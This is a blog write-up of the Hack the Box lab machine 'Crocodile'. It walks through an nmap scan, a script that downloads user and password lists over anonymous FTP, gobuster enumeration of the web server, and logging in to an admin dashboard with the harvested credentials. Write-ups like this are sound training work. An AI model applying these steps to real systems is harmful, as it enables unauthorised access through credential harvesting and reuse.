+++
title = "Crocodile on Hack the Box Write-up"
author = ["funcsec"]
date = 2022-01-23
publishDate = 2022-01-23
lastmod = 2022-01-23T23:17:22-08:00
tags = ["linux", "ftp", "gobuster"]
categories = ["writeup", "redteam"]
draft = false
toc = "true +"
omit_header_text = "+"
background_color_class = "bg-black-60"
description = "Write-up on Crocodile from Hack the Box"
featured_image = "images/george-shaw_st-domingo-crocodile.jpg"
images = ["images/george-shaw_st-domingo-crocodile.jpg"]
+++

Sometimes I like these quick, single vulnerability boxes because I can work on the speed of reporting.
Find the flag, then go back and answer the questions required to submit the flag.
Plus add a couple notes and modifications to the toolset in the notes, like the different wordlist for enumeration `http`.

---


## Executive Summary {#executive-summary}

The target machine suffered from broken access control vulnerability that allow for the harvesting of active user credentials from FTP.
Those same credentials could be used to login to a restriced part of the web application.


## Attack Narrative {#attack-narrative}

First, to make attacking the box easier, the ip address was set in the `/etc/hosts` file of the attacking machine.
This is to make the `crocodile` resolve to the IP, rather than continuing to put in the IP.
The IP will be notated as `crocodile` or `$ip` moving forward.

```bash
nmap -sV -sC $ip
```

```text
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-24 00:29 EST
Nmap scan report for crocodile (10.129.252.80)
Host is up (0.084s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.14.18
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Smash - Bootstrap Business Template
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.85 seconds
```

The `nmap` scan indicated that there was an open port 21, typically used for the FTP service.
With the `-sC` flag, `nmap` enumerates any files available on the FTP service that are available to the `Anonymous` user.
Those accessable files were then downloaded.

```bash
#!/bin/bash
set -euo pipefail
IP="$ip"
PORT=21
USER="anonymous"
PASS="anonymous"

ftp -inv -P $PORT $IP <<EOF
user $USER $PASS
pass
get allowed.userlist
get allowed.userlist.passwd
bye
EOF
echo "allowed.userlist ==============================="
cat "allowed.userlist"
echo "allowed.userlist.passwd ========================"
cat "allowed.userlist.passwd"
```

```text
Connected to crocodile.
220 (vsFTPd 3.0.3)
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
Passive mode: off; fallback to active mode: off.
local: allowed.userlist remote: allowed.userlist
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for allowed.userlist (33 bytes).
  0% |                                   |     0        0.00 KiB/s    --:-- ETA100% |***********************************|    33       96.19 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (0.38 KiB/s)
local: allowed.userlist.passwd remote: allowed.userlist.passwd
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).
  0% |                                   |     0        0.00 KiB/s    --:-- ETA100% |***********************************|    62      282.92 KiB/s    00:00 ETA
226 Transfer complete.
62 bytes received in 00:00 (0.73 KiB/s)
221 Goodbye.
allowed.userlist ===============================
aron
pwnmeow
egotisticalsw
admin
allowed.userlist.passwd ========================
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd
```

It was possible that the credentials harvested here could be used to access another FTP user.
The most intriguing were the admin credentials of `admin:rKXM59ESxesUFHAd`.

```text
kali@kali-vm:~$ ftp -inv -P 21 crocodile
Connected to crocodile.
220 (vsFTPd 3.0.3)
ftp> user admin rKXM59ESxesUFHAd
530 This FTP server is anonymous only.
Login failed.
```

Unfortunately, this was not the case `FTP server is anonymous only`.
The moving onto the next service on port 80.
Beginning was to enumerate the http service on port 80 with `gobuster`.

```text
kali@kali-vm:~$ gobuster dir -u http://crocodile:80 -w /usr/share/dirb/wordlists/common.txt

kali@kali-vm:~$ ===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://crocodile:80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/01/24 00:50:50 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 274]
/.hta                 (Status: 403) [Size: 274]
/.htaccess            (Status: 403) [Size: 274]
/assets               (Status: 301) [Size: 307] [--> http://crocodile/assets/]
/css                  (Status: 301) [Size: 304] [--> http://crocodile/css/]
/dashboard            (Status: 301) [Size: 310] [--> http://crocodile/dashboard/]
/fonts                (Status: 301) [Size: 306] [--> http://crocodile/fonts/]
/index.html           (Status: 200) [Size: 58565]
/js                   (Status: 301) [Size: 303] [--> http://crocodile/js/]
/server-status        (Status: 403) [Size: 274]

===============================================================
2022/01/24 00:51:30 Finished
===============================================================
```

The most interesting result was the page `/dashboad/` which contained a login page.

{{< figure src="/ox-hugo/crocodile_login.php.png" >}}

Obviously the next step was to try the admin credentials harvested from the FTP service.
Trying `admin:rKXM59ESxesUFHAd` was successful!

The flag was displayed as the banner of the dashboard, the following is the HTML source.

```html
<h1 class="h3 mb-0 text-gray-800">Here is your flag: [[ REDACTED ]]</h1>
```

The flag was found. It was `HTB{[[ REDACTED ]]}`.

---

Fun and fast single flag exercise!
The next couple will all come from Proving Grounds.
Not sure if I like "Attack Narritive" better than "Methodology".
